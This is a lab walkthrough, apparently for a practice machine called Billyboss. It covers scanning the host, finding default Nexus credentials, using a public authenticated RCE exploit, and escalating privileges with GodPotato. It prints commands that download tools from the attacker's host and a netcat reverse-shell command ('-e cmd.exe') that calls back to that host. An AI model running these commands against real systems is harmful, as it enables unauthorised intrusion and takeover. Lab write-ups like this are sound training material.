---
icon: windows
---

# Billyboss - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.161.61 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 11:52 EDT
Nmap scan report for 192.168.161.61
Host is up (0.026s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT                                                                                                                                
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                              
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH                                                                                   
|_http-title: BaGet                                                                                                                                 
|_http-server-header: Microsoft-IIS/10.0                                                                                                            
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                         
445/tcp   open  microsoft-ds?                                                                                                                       
5040/tcp  open  unknown                                                                                                                             
7680/tcp  open  pando-pub?                                                                                                                          
8081/tcp  open  http          Jetty 9.4.18.v20190429                                                                                                
| http-robots.txt: 2 disallowed entries                                                                                                             
|_/repository/ /service/                                                                                                                            
|_http-title: Nexus Repository Manager                                                                                                              
|_http-server-header: Nexus/3.21.0-05 (OSS)                                                                                                         
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49665/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49668/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49669/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
Device type: general purpose                                                                                                                        
Running (JUST GUESSING): Microsoft Windows 10|2019|7|2008|8.1 (98%)                                                                                 
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1                                                                                                                                
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2019 (90%), Microsoft Windows 10 1903 - 21H1 (90%), Microsoft Windows 10 1709 - 21H2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 20H2 - 21H1 (88%), Microsoft Windows 10 21H2 (88%)                                                                                        
No exact OS matches for host (test conditions non-ideal).                                                                                           
Network Distance: 4 hops                                                                                                                            
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                            
                                                                                                                                                    
Host script results:                                                                                                                                
| smb2-time:                                                                                                                                        
|   date: 2025-10-01T15:56:36                                                                                                                       
|_  start_date: N/A                                                                                                                                 
| smb2-security-mode:                                                                                                                               
|   3:1:1:                                                                                                                                          
|_    Message signing enabled but not required                                                                                                      
                                                                                                                                                    
TRACEROUTE (using port 8888/tcp)                                                                                                                    
HOP RTT      ADDRESS                                                                                                                                
1   24.53 ms 192.168.45.1                                                                                                                           
2   24.68 ms 192.168.45.254                                                                                                                         
3   24.71 ms 192.168.251.1                                                                                                                          
4   24.92 ms 192.168.161.61
```

### <mark style="color:$primary;">HTTP Port 8081 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2271).png" alt=""><figcaption></figcaption></figure>

Upon visiting the site a version is being leaked! searchsploit reveals an exploit for this specific version

<figure><img src="../../.gitbook/assets/image (2272).png" alt=""><figcaption></figcaption></figure>

However in order to get this exploit to work we need to find some creds. I am going to look for some credentials. The one's I found online do not seem to work I'll take another look at the Seclists Password repository

```
grep -r -i 'Sonatype Nexus' ~/tools/SecLists/Passwords/
```

<figure><img src="../../.gitbook/assets/image (2273).png" alt=""><figcaption></figcaption></figure>

We got a couple of more we can try!

<figure><img src="../../.gitbook/assets/image (2274).png" alt=""><figcaption></figcaption></figure>

```
nexus:nexus
```

We found some working creds, now let's go back and try the exploit.

### <mark style="color:$primary;">Sonatype Nexus 3.21.1 - RCE \[Authenticated]</mark>

I am going to download and take a look at the exploit

```
searchsploit -m 49385
```

<figure><img src="../../.gitbook/assets/image (2275).png" alt=""><figcaption></figcaption></figure>

We have code execution right here, I am going to update these variable and have it download nc64.exe from my machine

```
URL='http://192.168.161.61:8081'
CMD='certutil -urlcache -f http://192.168.45.158/nc64.exe c:/windows/temp/nc64.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

<figure><img src="../../.gitbook/assets/image (2276).png" alt=""><figcaption></figcaption></figure>

make sure you are hosting nc64.exe before running this script

<figure><img src="../../.gitbook/assets/image (2277).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2278).png" alt=""><figcaption></figcaption></figure>

And we got a hit, next I am going to update the script to get a reverse shell

<figure><img src="../../.gitbook/assets/image (2279).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready, than execute the script again

<figure><img src="../../.gitbook/assets/image (2280).png" alt=""><figcaption></figcaption></figure>

And we got a shell as nathan!

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2281).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SeImpersonatePrivilege</mark>

I will be using [**Godpotato**](https://github.com/BeichenDream/GodPotato/releases) to escalate my privileges to Administrator. I'll download it to the target machine

```
iwr -uri http://192.168.45.158/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
```

<figure><img src="../../.gitbook/assets/image (2282).png" alt=""><figcaption></figcaption></figure>

```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

<figure><img src="../../.gitbook/assets/image (2283).png" alt=""><figcaption></figcaption></figure>

Now we can execute commands as the admin user! I am going to use nc64 to get a reverse shell as the admin user. Make sure you have a listener ready before executing the below command

```
.\GodPotato-NET4.exe -cmd "c:/windows/temp/nc64 192.168.45.158 135 -e cmd.exe"
```

<figure><img src="../../.gitbook/assets/image (2284).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2285).png" alt=""><figcaption></figcaption></figure>

We got a shell as Administrator, whoami does not seem to work. But we have his privileges!
